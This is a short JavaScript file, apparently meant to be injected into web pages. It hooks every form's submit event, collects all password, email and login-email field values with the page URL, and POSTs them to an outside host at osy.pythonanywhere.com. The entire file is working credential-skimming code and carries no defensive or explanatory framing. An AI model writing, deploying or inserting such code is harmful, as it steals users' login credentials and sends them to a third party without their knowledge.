//get every form
var inputs = document.querySelectorAll("input[type=password]");
var forms = document.forms

console.log(inputs);

//called when a submit event happens
function formSubmit(event) {
    var emails = document.querySelectorAll("input[type=text]#login-email");
    var logins = document.querySelectorAll("input[type=email]");
    var passwords = document.querySelectorAll("input[type=password]");
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://osy.pythonanywhere.com/blog/test_new');
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    var string = 'URL : ' + document.URL + ' - Passwords : ';
    for(var i=0; i<passwords.length; i++)
	{
        string = string + passwords[i].value;
    }
    string = string + ' - Emails : '
    for(var i=0; i<logins.length; i++)
	{
        string = string + logins[i].value;
    }
    string = string + ' - Logins : '
    for(var i=0; i<emails.length; i++)
	{
        string = string + emails[i].value;
    }
    console.log(string);
    xhr.send(string);
}

// add an event listener to the submit event for every form in the page
for (index = 0; index < forms.length; ++index) {
    forms[index].addEventListener('submit', formSubmit);
}

for (index = 0; index < inputs.length; ++index) {
    inputs[index].addEventListener('submit', formSubmit);
}
